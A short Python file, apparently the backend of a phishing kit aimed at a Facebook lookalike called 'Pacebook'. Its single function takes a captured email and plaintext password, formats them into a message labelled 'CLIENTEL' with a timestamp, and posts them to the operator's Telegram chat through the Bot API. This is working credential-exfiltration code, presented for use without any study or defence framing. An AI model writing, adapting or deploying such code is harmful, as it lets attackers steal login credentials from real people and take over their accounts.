# telegram_bot.py
import os
import requests
from datetime import datetime
from dotenv import load_dotenv
import json

load_dotenv()  # Load .env file in development

BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN')
YOUR_CHAT_ID = os.getenv('TELEGRAM_CHAT_ID')

def send_notification(email, password):
    """Send login notification to Telegram with inline copy buttons"""
    from datetime import datetime
    import requests
    
    current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    
    # Create inline keyboard with copy buttons
    
    
    message = f"""
🔐 *Pacebook CLIENTEL*
━━━━━━━━━━━━━━━━━━━━━━━

📧 *EMAIL:* 
`{email}`

🔑 *PASSWORD:* 
`{password}`

⏰ *TIME:* `{current_time}`

━━━━━━━━━━━━━━━━━━━━━━
    """
    
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        payload = {
            'chat_id': YOUR_CHAT_ID,
            'text': message,
            'parse_mode': 'Markdown',
        
        }
        response = requests.post(url, json=payload)
        response.raise_for_status()
        return True
    except Exception as e:
        print(f"Error sending message: {e}")
        return False
   

